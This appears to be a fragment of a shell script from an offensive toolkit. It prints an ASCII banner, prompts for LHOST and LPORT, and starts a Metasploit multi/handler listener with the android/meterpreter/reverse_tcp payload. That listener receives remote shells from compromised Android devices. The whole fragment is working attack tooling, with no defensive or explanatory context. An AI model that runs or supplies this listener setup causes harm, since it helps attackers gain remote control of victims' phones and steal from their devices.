 echo "|=========================|
|  |     |  |         -   |
|  |     |  |       -     |
|  |     |  |     -       |
|  |     |  |   -         |
|  |-----|  | -           |
|  |     |  |-            |
|  |-----|  | -           |
|  |     |  |   -         |
|  |     |  |     -       |
|  |     |  |       -     |
|  |     |  |         -   |
|  |     |  |           - |
|=========================|
"
    echo "Enter the LHOST: :"
    read seslhost
    echo "Enter the LPORT: :"
    read seslport
    
    msfconsole -q -x" use exploit/multi/handler " -x" set payload android/meterpreter/reverse_tcp" -x"set LHOST $seslhost" -x "  set LPORT $seslport" -x "exploit"